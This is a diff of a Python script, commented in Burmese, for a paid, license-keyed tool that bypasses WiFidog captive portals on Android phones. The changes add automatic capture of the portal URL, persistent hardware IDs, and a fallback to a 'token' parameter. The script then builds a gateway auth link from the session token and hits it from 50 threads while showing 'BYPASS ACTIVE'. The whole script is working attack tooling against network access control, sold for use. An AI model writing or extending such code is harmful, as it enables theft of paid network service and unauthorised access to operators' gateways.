@@ -1,3 +1,6 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
 import requests
 import re
 import urllib3
@@ -18,6 +21,7 @@ os.environ['PYTHONWARNINGS'] = 'ignore'
 # ==========================================
 GIST_RAW_URL = "https://raw.githubusercontent.com/Zyan091/my-database/refs/heads/main/key.txt"
 KEY_FILE = os.path.join(os.path.expanduser("~"), ".alli_key.txt")
+HWID_FILE = os.path.join(os.path.expanduser("~"), ".alli_hwid.txt") # HWID အသေသိမ်းရန်ဖိုင်
 THREADS = 50 # Gaming အတွက် အကောင်းဆုံး thread
 
 # COLORS
@@ -27,18 +31,29 @@ O = "\033[38;5;214m" # Orange
 G = "\033[92m"   # Green
 R = "\033[91m"   # Red
 C = "\033[96m"   # Cyan
+YELLOW = "\033[93m"
 BOLD, RESET = "\033[1m", "\033[0m"
 
 def get_hwid():
-    """Redmi 8 HWID"""
+    """Redmi 8 HWID - ထွက်ပြီးပြန်ဝင်လည်း ID လုံးဝမပြောင်းလဲစေရန် Local ဖိုင်ဖြင့် ထိန်းသိမ်းခြင်း"""
+    if os.path.exists(HWID_FILE):
+        with open(HWID_FILE, "r") as f:
+            saved_hwid = f.read().strip()
+            if saved_hwid: return saved_hwid
+
     try:
         model = subprocess.check_output("getprop ro.product.model", shell=True).decode().strip()
         serial = subprocess.check_output("getprop ro.serialno", shell=True).decode().strip()
-        return hashlib.sha256(f"{model}{serial}ZYAN-PRO".encode()).hexdigest()[:14].upper()
-    except: return "ALLI-DEV-ERR"
+        new_hwid = hashlib.sha256(f"{model}{serial}ZYAN-PRO".encode()).hexdigest()[:14].upper()
+        
+        with open(HWID_FILE, "w") as f:
+            f.write(new_hwid)
+        return new_hwid
+    except: 
+        return "ALLI-DEV-ERR"
 
 def verify_license(user_key, current_hwid):
-    """Key & Expiry စစ်ဆေးခြင်း"""
+    """Key & Expiry (နေ့ရက်/အချိန်) များကို Database တွင် အသေးစိတ်စစ်ဆေးခြင်း"""
     try:
         response = requests.get(f"{GIST_RAW_URL}?nocache={time.time()}", timeout=10, verify=False)
         for line in response.text.splitlines():
@@ -49,10 +64,21 @@ def verify_license(user_key, current_hwid):
                 diff = exp_date - datetime.now()
                 if diff.total_seconds() <= 0: return {"v": False, "m": "EXPIRED"}
                 if stored_hwid == "None" or stored_hwid == current_hwid:
-                    time_left = f"{diff.days}D {diff.seconds // 3600}H {(diff.seconds // 60) % 60}M"
+                    time_left = f"{diff.days} ရက်၊ {diff.seconds // 3600} နာရီ၊ {(diff.seconds // 60) % 60} မိနစ်"
                     return {"v": True, "m": time_left, "key": k, "exp": expiry_str}
         return {"v": False, "m": "INVALID KEY"}
     except: return {"v": False, "m": "OFFLINE"}
+
+def auto_capture_portal():
+    """ဝိုင်ဖိုင်လင့်ခ်ကို Background တွင် အလိုအလျောက် လှမ်းဖတ်သည့်စနစ်"""
+    test_url = "http://connectivitycheck.gstatic.com/generate_204"
+    try:
+        r = requests.get(test_url, allow_redirects=True, timeout=5, verify=False)
+        if r.url != test_url:
+            return r.url
+    except:
+        pass
+    return None
 
 def turbo_ping(auth_link):
     """မူရင်း Engine Logic (MLBB ငြိမ်စေရန်)"""
@@ -69,7 +95,7 @@ def turbo_ping(auth_link):
 
 def banner():
     subprocess.run("clear", shell=True)
-    # Alli အလိုရှိသော အဖြူနှင့် ပန်းရောင်စပ်
+    # Alli အလိုရှိသော အဖြူနှင့် ပန်းရောင်စပ် Premium Banner
     print(f"{P}{BOLD}    █████╗ ██╗     ██╗     ██╗")
     print(f"   ██╔══██╗██║     ██║     ██║")
     print(f"{W}   ███████║██║     ██║     ██║")
@@ -97,13 +123,25 @@ def start():
 
     with open(KEY_FILE, "w") as f: f.write(key)
     
-    print(f"\n{O}[*] Please paste your Portal URL below:{RESET}")
-    portal_url = input(f"{O}[>] URL: {W}").strip()
+    # ----------------------------------------------------
+    # NEW HYBRID SYSTEM - AUTO DETECT WITH MANUAL FALLBACK
+    # ----------------------------------------------------
+    print(f"\n{O}[*] Scanning WiFi Portal Automatically...{RESET}")
+    portal_url = auto_capture_portal()
+    
+    if portal_url:
+        print(f"{G}[✓] WiFi Portal Detected Automatically!{RESET}")
+        time.sleep(1)
+    else:
+        # Auto ဖတ်မရပါက အရင်အတိုင်း လက်နဲ့ထည့်ခိုင်းမည်ဖြစ်၍ လိုင်းဆွဲအားကို စိတ်ချရပါသည်
+        print(f"{YELLOW}[!] Auto-Scan missed. Please paste your URL manually below:{RESET}")
+        portal_url = input(f"{O}[>] URL: {W}").strip()
+    # ----------------------------------------------------
     
     try:
         parsed = urlparse(portal_url)
         params = parse_qs(parsed.query)
-        sid = params.get('sessionId', [None])[0]
+        sid = params.get('sessionId', [None])[0] or params.get('token', [None])[0]
         gw_addr = params.get('gw_address', ["192.168.110.1"])[0]
         gw_port = params.get('gw_port', ['2060'])[0]
 
@@ -113,17 +151,18 @@ def start():
         auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}"
         
         banner()
-        print(f"{G}[✓] BYPASS ACTIVE!{RESET}")
+        # ဝယ်သူတွေ ယုံကြည်မှုတက်စေမည့် အသေးစိတ် အချက်အလက်မျက်နှာပြင်
+        print(f"{G}[✓] BYPASS ACTIVE! (PREMIUM LICENSE){RESET}")
         print(f"{W}  ------------------------------------------")
-        print(f"{P}[+] KEY     : {W}{auth['key']}")
-        print(f"{P}[+] EXPIRY  : {W}{auth['exp']}")
-        print(f"{P}[+] REMAIN  : {O}{BOLD}{auth['m']}{RESET}")
+        print(f"{P}[+] YOUR KEY : {W}{auth['key']}")
+        print(f"{P}[+] EXP DATE : {W}{auth['exp']}")
+        print(f"{P}[+] TIME LEFT: {O}{BOLD}{auth['m']}{RESET}")
         print(f"{W}  ------------------------------------------")
 
         for _ in range(THREADS):
             threading.Thread(target=turbo_ping, args=(auth_link,), daemon=True).start()
 
-        # ရောင်စုံ မှိတ်တုတ်မှိတ်တုတ် Animation
+        # အောက်ခြေ ရောင်စုံ Status Animation (Syntax Error Fix ပြီး)
         colors = [P, W, O, G, C]
         i = 0
         while True:
@@ -138,4 +177,4 @@ def start():
 
 if __name__ == "__main__":
     try: start()
-    except KeyboardInterrupt: sys.exit()        
+    except KeyboardInterrupt: sys.exit()            
